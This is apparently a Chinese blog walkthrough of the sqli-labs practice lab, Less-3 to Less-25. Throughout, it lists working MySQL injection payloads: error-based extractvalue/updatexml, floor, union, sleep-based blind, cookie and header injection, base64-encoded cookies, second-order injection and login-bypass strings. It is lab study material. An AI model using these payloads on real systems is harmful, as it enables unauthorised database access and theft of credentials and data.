<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-25/index.php?id=1' || extractvalue(0x20,concat(0x7c,(version()),0x7c)) ||'</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>再尝试得到表名</li>
</ol>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-25/index.php?id=1' || extractvalue(0x20,concat(0x7c,(select group_concat(0x20,table_name) from mysql.innodb_table_stats where database_name = database() limit 2),0x7c)) ||'</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '| emails, referers, uagents, use'</span><br></pre></td></tr></table></figure>

<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><blockquote>
<p>高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p>
</blockquote>
<p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name = <span class="keyword">database</span>();</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_index_stats <span class="keyword">where</span> database_name = <span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>

<p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">CTF|mysql 之无列名注入</a></li>
<li><a href="https://www.cnblogs.com/hello-there/p/12918265.html" target="_blank" rel="noopener">[SWPU2019]Web1(二次注入,无列名注入,bypass information_schema) </a></li>
</ul>
<h1 id="Less-24-Second-Degree-Injections"><a href="#Less-24-Second-Degree-Injections" class="headerlink" title="Less-24 - Second Degree Injections"></a>Less-24 - Second Degree Injections</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592582913236-d9f8a9ed-33a3-4ab6-866d-52945e92571b.png#align=left&display=inline&height=384&margin=%5Bobject%20Object%5D&name=image.png&originHeight=511&originWidth=854&size=55688&status=done&style=none&width=641" alt="image.png"><br>二次注入，在登录时注册带有 payload 的用户名，改密码时取用的值未进行转义导致注入。<br><code>/Less-24/pass_change.php</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">...</span><br><span class="line">if($pass==$re_pass)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592569574436-f326b619-d219-4214-9019-e46b8596b875.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=admin%23.png&originHeight=694&originWidth=424&size=79240&status=done&style=none&width=209" alt="admin#.png">)更改密码后<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592569847089-af2729c4-2589-46ae-b9de-539c4f564494.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&name=banner.png&originHeight=886&originWidth=1443&size=315567&status=done&style=none&width=361" alt="banner.png"><br><code>admin</code>的密码已经被成功更改<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592569763758-fecb935d-098c-4381-955d-ab71ebff6f50.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=ADMIN2.png&originHeight=684&originWidth=414&size=76847&status=done&style=none&width=207" alt="ADMIN2.png"><br>网上大部分教程，都是到更改<code>admin</code>的密码就结束了。那么我尝试了对这个注入点进行报错注入，j 即注册名字为如下 payload 的用户</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(0x20,concat(0x7c,version(),0x7c)) and '</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592570103001-f13eaf77-f49e-4e86-932a-11b3e275ab7c.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=too_long.png&originHeight=239&originWidth=1116&size=9796&status=done&style=none&width=1116" alt="too_long.png"><br>发现它提示用户名太长了，搜索一番之后解决方案不易实现（都需要改 php.ini 并重启），写了以下二次注入脚本</p>
<p>ref:</p>
<ul>
<li><a href="https://blog.csdn.net/zhaopeipei1985/article/details/2633997" target="_blank" rel="noopener"> 成功解决 data too long for column ‘name’ at row 1</a></li>
</ul>
<h1 id="Less-23-Error-Based-no-comments"><a href="#Less-23-Error-Based-no-comments" class="headerlink" title="Less-23 Error Based- no comments"></a>Less-23 <strong>Error Based- no comments</strong></h1><p>把注释替换掉了，那么就要想其它办法闭合。这里采用运算符<code>&gt;</code>来连接 payload，实际上<code>- * | %</code>都可以作为双目运算符连接. 单目运算符的话，可以用<code>! ^</code>等</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1' and ''&gt;(extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ) or '</span><br><span class="line">//无论单双目运算符，只要闭合语句即可</span><br><span class="line">id=1' and ~(extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ) or '</span><br></pre></td></tr></table></figure>

<h1 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string</h1><p>cookie 注入，双引号，直接用 burp 的 Pitchfork 模式来 fuzzing，第一个位置是 base64 编码的 payload，第二个是占位用的原始 payload，可以看到双引号<code>&quot;</code>有报错<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592458022007-a5ad99a4-0790-4adc-85ec-c1c2593a24c3.png#align=left&display=inline&height=477&margin=%5Bobject%20Object%5D&name=image.png&originHeight=953&originWidth=1915&size=223120&status=done&style=none&width=957.5" alt="image.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin"and extractvalue(0x20,concat(0x7c7c,version(),0x7c7c))-- -</span><br><span class="line"></span><br><span class="line"><span class="section"># 同样的，base64 编码</span></span><br><span class="line"></span><br><span class="line">YWRtaW4iYW5kIGV4dHJhY3R2YWx1ZSgweDIwLGNvbmNhdCgweDdjN2MsdmVyc2lvbigpLDB4N2M3YykpLS0gLQ==</span><br></pre></td></tr></table></figure>

<h1 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a>Less-21 Cookie Injection- Error Based- complex - string</h1><p>cookie 注入，只不过需要先 base64 编码</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	payload如下</span><br><span class="line">admin'and extractvalue(0x20, concat(0x7c,version(),0x7c)) and '</span><br><span class="line">	base64编码如下</span><br><span class="line"><span class="attribute">YWRtaW4nYW5kIGV4dHJhY3R2YWx1ZSgweDIwLCBjb25jYXQoMHg3Yyx2ZXJzaW9uKCksMHg3YykpIGFuZCAn</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592408875594-64d93452-df5f-4f9f-b37b-3e708cd63b35.png#align=left&display=inline&height=249&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=1917&size=104138&status=done&style=none&width=958.5" alt="image.png"></p>
<h1 id="Less-20-Cookie-Injection-Error-Based-string"><a href="#Less-20-Cookie-Injection-Error-Based-string" class="headerlink" title="Less-20 Cookie Injection- Error Based- string"></a>Less-20 Cookie Injection- Error Based- string</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592407109925-acfdbfdf-16bb-49a5-92d7-29a0d16cc7aa.png#align=left&display=inline&height=419&margin=%5Bobject%20Object%5D&name=image.png&originHeight=837&originWidth=1919&size=442631&status=done&style=none&width=959.5" alt="image.png"><br>cookie 注入，在登录之后，更改 cookie，加单引号发现报错，猜测原始语句，构造如下 payload 即可</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=admin'and extractvalue(0x20,concat(0x7c,version())) -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-19-Header-Injection-Referer-Error-Based-string"><a href="#Less-19-Header-Injection-Referer-Error-Based-string" class="headerlink" title="Less-19 Header Injection- Referer- Error Based- string"></a>Less-19 Header Injection- Referer- Error Based- string</h1><p>到这里才摸到一点门道，一样的报错注入，<code>&#39;and [payload] and&#39;</code>的形式，用<code>0x7c</code>（也就是<code>|</code>）把查询内容<code>version()</code>字符串化，报错输出</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 123321'and extractvalue(0x20, concat(0x7c,version(),0x7c)) and '</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<h1 id="Less-18-Header-Injection-Error-Based-string"><a href="#Less-18-Header-Injection-Error-Based-string" class="headerlink" title="Less-18 Header Injection- Error Based- string"></a>Less-18 Header Injection- Error Based- string</h1><p>通过阅读源码，知道了语句结构</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";</span><br></pre></td></tr></table></figure>

<p>但为啥这样闭合我是真没想明白。。。。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: 'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span><br></pre></td></tr></table></figure>

<p>【后续】想明白了，最终的语句即<code>&#39;``&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;``&#39;</code> ，中间就是我们拼接的 payload，实际上是参与<strong>与运算</strong>得到的一个值，这<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592377145499-e2f1f2da-8777-41f8-897d-06e0549e5c46.png#align=left&display=inline&height=270&margin=%5Bobject%20Object%5D&name=image.png&originHeight=539&originWidth=1206&size=73778&status=done&style=none&width=603" alt="image.png"><br>最后用如下语句完成了报错注入,</p>
<ul>
<li><code>7c</code> -&gt; <code>|</code></li>
<li><code>3a</code> -&gt; <code>:</code></li>
</ul>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span><br></pre></td></tr></table></figure>

<h1 id="Less-17-Update-Query-Error-based-String"><a href="#Less-17-Update-Query-Error-based-String" class="headerlink" title="Less-17 Update Query- Error based - String"></a>Less-17 Update Query- Error based - String</h1><p>测试当用户名是<code>admin</code>时，密码框有报错注入<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592143252481-0148265c-d490-4009-bf3d-6310ac4de355.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&name=image.png&originHeight=903&originWidth=1462&size=462720&status=done&style=none&width=731" alt="image.png"></p>
<h1 id="Less-16-Blind-Time-Based-Double-quotes-String"><a href="#Less-16-Blind-Time-Based-Double-quotes-String" class="headerlink" title="Less-16- Blind- Time Based- Double quotes- String"></a>Less-16- Blind- Time Based- Double quotes- String</h1><p>确定闭合符号，<br>子查询确定注入符号</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">")or (select 1 from (select sleep(2) )x)-- -1</span></span><br></pre></td></tr></table></figure>

<p>延时 2 秒</p>
<h1 id="Less-15-Blind-Boolian-Based-String"><a href="#Less-15-Blind-Boolian-Based-String" class="headerlink" title="Less-15- Blind- Boolian Based- String"></a>Less-15- Blind- Boolian Based- String</h1><p>加单双引号都不报错了，知道用户名是<code>admin</code>的情况下，只能通过是否成功登录来确定闭合符号<br>闭合符号是单引号</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<p>是延时盲注。</p>
<h1 id="Less-14-Double-Injection-Double-quotes-String"><a href="#Less-14-Double-Injection-Double-quotes-String" class="headerlink" title="Less-14- Double Injection- Double quotes- String"></a>Less-14- Double Injection- Double quotes- String</h1><p>加双引号报错了，接着确定出闭合符号就是双引号<code>&quot;</code>，下一步直接进行注入即可<br>没有回显的情况下，即使使用<code>order by</code>确定了有两列数据 ，但用<code>UNION</code>就只有走布尔盲注那条路，并且基于<code>floor</code>的报错注入要求表中至少要有三项以上的数据，显然是行不通的。<br>把前面的<code>payload</code>里的闭合符号改改，快速通过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin" and extractvalue(1, concat(0x5c,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">1</span>),<span class="string">'~'</span>));<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-13-Double-Injection-String-with-twist"><a href="#Less-13-Double-Injection-String-with-twist" class="headerlink" title="Less-13- Double Injection- String- with twist"></a>Less-13- Double Injection- String- with twist</h1><p>加单引号报错，闭合符号是<code>&#39;)</code>，用<code>admin&#39;)-- -</code>，没想到是万能密码直接成功登录了<br>同样的用<code>sqlmap</code>冲，即可。但是我还是选择手工搞报错注入，一定要把末尾闭合，才能得到报错注入出来的信息！</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆版本号</span></span><br><span class="line">admin') and extractvalue(1,concat("~",version(),"~"))<span class="comment">-- -</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1 id="Less-12-Error-Based-Double-quotes-String"><a href="#Less-12-Error-Based-Double-quotes-String" class="headerlink" title="Less-12- Error Based- Double quotes- String"></a>Less-12- Error Based- Double quotes- String</h1><p>确定闭合符号的时候遇到点问题，一开始用<code>admin&quot;</code>的时候报错，但是万能密码却尝试失败<code>admin&quot;or&quot;&quot;=&quot;</code>, 后来使用注释来确定闭合符号<code>admin&quot;-- -</code>、<code>admin&quot;)-- -</code>成功闭合</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 万能密码</span></span><br><span class="line">admin")or""=("</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释绕过</span></span><br><span class="line">因为最后有个 LIMIT 1，1  就不太能用username=<span class="comment">/*&amp;password=*/</span>的方式来绕过密码</span><br></pre></td></tr></table></figure>

<p>直接跑<code>sqlmap -r</code> 即可</p>
<h1 id="Less-11-Error-Based-String"><a href="#Less-11-Error-Based-String" class="headerlink" title="Less-11- Error Based- String"></a>Less-11- Error Based- String</h1><h2 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h2><p>加引号，报错。确定用单引号闭合<code>admin&#39; -- -</code>, 报错注入+<code>UNION</code>联合注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 万能密码</span></span><br><span class="line"></span><br><span class="line">admin' or ''='</span><br><span class="line">admin' and extractvalue(1,concat("~",(version()),"~"))-- -</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Less-10：Blind-Time-based-Double-Quotes-String"><a href="#Less-10：Blind-Time-based-Double-Quotes-String" class="headerlink" title="Less-10：Blind- Time based- Double Quotes- String"></a>Less-10：Blind- Time based- Double Quotes- String</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1" and sleep(2)='1' <span class="comment">-- -		有延时</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-9：Blind-Time-based-Single-Quotes-String"><a href="#Less-9：Blind-Time-based-Single-Quotes-String" class="headerlink" title="Less-9：Blind- Time based- Single Quotes- String"></a>Less-9：Blind- Time based- Single Quotes- String</h1><p>无论是添加引号还是注释，都完全不报错。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2' AND '1'=SLEEP(1)<span class="comment">-- -		有延时</span></span><br><span class="line">id=2' AND '1'=SLEEP(5)<span class="comment">-- -		有延时</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-8：Blind-Boolian-Single-Quotes-String"><a href="#Less-8：Blind-Boolian-Single-Quotes-String" class="headerlink" title="Less-8：Blind- Boolian- Single Quotes- String"></a>Less-8：Blind- Boolian- Single Quotes- String</h1><p>有状态回显，闭合符号是单引号<code>&#39;</code> ，<br>根据是否回显<code>You are in...........</code>来判断.<br>得出结论，盲注可分为两类：布尔盲注+基于时间的盲注。<br>因为没有 t/f 的回显，即从响应上看不出任何差异（响应包括：响应大小/状态码/页内文字）</p>
<h1 id="Less-7：Dump-into-Outfile"><a href="#Less-7：Dump-into-Outfile" class="headerlink" title="Less-7：Dump into Outfile"></a>Less-7：Dump into Outfile</h1><p>无数据和错误回显，依然是先确定闭合。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1' <span class="comment">-- -		报错</span></span><br><span class="line">id=1') <span class="comment">-- -		报错</span></span><br><span class="line">id=1')) <span class="comment">-- -		正常</span></span><br></pre></td></tr></table></figure>

<p>布尔盲注+延时注入，sqlmap 一把梭了</p>
<h1 id="Less-6：Double-Query-Double-Quotes-String"><a href="#Less-6：Double-Query-Double-Quotes-String" class="headerlink" title="Less-6：Double Query- Double Quotes- String"></a>Less-6：Double Query- Double Quotes- String</h1><p>闭合变成单引号，其余于 Less 5 一样</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1" and updatexml("1",concat("~",version(),"~"),"1")<span class="comment">-- -</span></span><br><span class="line"><span class="comment"># 单行</span></span><br><span class="line">id=1" and updatexml("1",concat("~",(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="number">0x20</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>))),<span class="string">"~"</span>),<span class="string">"1"</span>)<span class="comment">-- -</span></span><br><span class="line"><span class="comment"># 多行</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">" and updatexml("</span><span class="number">1</span><span class="string">",concat("</span>~<span class="string">",((select group_concat(column_name) from information_schema.columns where table_name='emails')),"</span>~<span class="string">"),"</span><span class="number">1</span><span class="string">")-- -</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-5：Double-Query-Single-Quotes-String"><a href="#Less-5：Double-Query-Single-Quotes-String" class="headerlink" title="Less-5：Double Query- Single Quotes- String"></a>Less-5：Double Query- Single Quotes- String</h1><p>无数据回显的注入点</p>
<h2 id="闭合-1"><a href="#闭合-1" class="headerlink" title="闭合"></a>闭合</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1"		正常</span><br><span class="line">id=1'		报错</span><br><span class="line">id=1'<span class="comment">-- -		正常</span></span><br></pre></td></tr></table></figure>

<p>闭合字符串是单引号<code>&#39;</code>，猜测后端语句是<code>select id from test where id=&#39;$id&#39;;</code><br>因为没有回显位，无法使用联合注入，但可用 union 引入 floor 的报错注入</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id=1' AND EXTRACTVALUE(1,concat("~",(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="string">"~"</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">' AND EXTRACTVALUE(1,concat("~",(select group_concat(column_name) from information_schema.columns where table_name='</span>emails<span class="string">'),"~"))-- -</span></span><br><span class="line"><span class="string">id=1'</span> <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">"~"</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="string">"~"</span>))<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># floor</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">' UNION SELECT null,null,null from (SELECT COUNT(*),concat(floor(rand(0)*2),"~",version())x from information_schema.tables group by x )x-- -</span></span><br><span class="line"><span class="string">id=1'</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> (<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="string">"~"</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="number">0x20</span>,table_name) <span class="keyword">from</span> information_schema.tables ))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )x<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-4：Error-Based-DoubleQuotes-String"><a href="#Less-4：Error-Based-DoubleQuotes-String" class="headerlink" title="Less-4：Error Based- DoubleQuotes String"></a>Less-4：Error Based- DoubleQuotes String</h1><h2 id="闭合-2"><a href="#闭合-2" class="headerlink" title="闭合"></a>闭合</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1'	   正常</span><br><span class="line">id=1"	   报错</span><br><span class="line">id=1" <span class="comment">-- -		报错</span></span><br><span class="line">id=1") <span class="comment">-- -   正常</span></span><br></pre></td></tr></table></figure>

<p>闭合字符串是<code>&quot;)</code>合理猜测原语句结构为<code>select id from test where id=(&quot;$id&quot;);</code></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 联合</span></span><br><span class="line">id=-2") union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name,<span class="number">0x20</span>) <span class="keyword">from</span> information_schema.schemata <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 报错</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">")+AND+updatexml(1,concat("</span>~<span class="string">",(select+version()),'~'),1)-- -</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586505197604-40c983d2-34cc-4005-a2ec-9d61d6653b24.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&name=image.png&originHeight=274&originWidth=1903&size=50340&status=done&style=none&width=951.5" alt="image.png"></p>
<h1 id="less-3：Error-Based-String-with-Twist"><a href="#less-3：Error-Based-String-with-Twist" class="headerlink" title="less-3：Error Based- String (with Twist)"></a>less-3：Error Based- String (with Twist)</h1><h2 id="确定闭合符号啊！"><a href="#确定闭合符号啊！" class="headerlink" title="确定闭合符号啊！"></a>确定闭合符号啊！</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1'		报错</span><br><span class="line">id=1' <span class="comment">-- -  报错</span></span><br><span class="line">id=1') <span class="comment">-- -  正常</span></span><br></pre></td></tr></table></figure>

<p>确定闭合符号是<code>&#39;)</code>，就可以按照之前的步骤来注入了</p>
<h2 id="联合注"><a href="#联合注" class="headerlink" title="联合注"></a>联合注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id=-2') union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name,<span class="number">0x20</span>) <span class="keyword">from</span> information_schema.schemata <span class="comment">-- -</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-2</span><span class="string">') union select 1,2,group_concat(table_name,0x20) from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' -- -</span></span><br><span class="line"><span class="string">id=-2'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name,<span class="number">0x20</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h2 id="报错注"><a href="#报错注" class="headerlink" title="报错注"></a>报错注</h2><p><strong>有回显长度的限制</strong><br>如果不用 concat 把它字符串化，会导致结果回显失败</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=-1')+AND+updatexml(1,concat("~",(<span class="keyword">select</span>+<span class="keyword">version</span>()),<span class="string">'~'</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">')+AND+extractvalue(1,concat("~",(select+version()),'</span>~<span class="string">'))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=-1'</span>) <span class="keyword">and</span> extractvalue(<span class="number">1</span>, (<span class="keyword">SELECT</span>+<span class="keyword">group_concat</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">0x20</span>)+<span class="keyword">FROM</span>+information_schema.columns))<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">') union select 1,2,3 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )a-- -</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586502458478-76f20c40-ccc1-4ded-8e1d-f6ea67f5fded.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1710&size=31954&status=done&style=none&width=855" alt="image.png"><br><strong>floor 无回显限制</strong><br>从<code>sqlmap</code>提取出来的攻击向量<code>Vector</code></p>
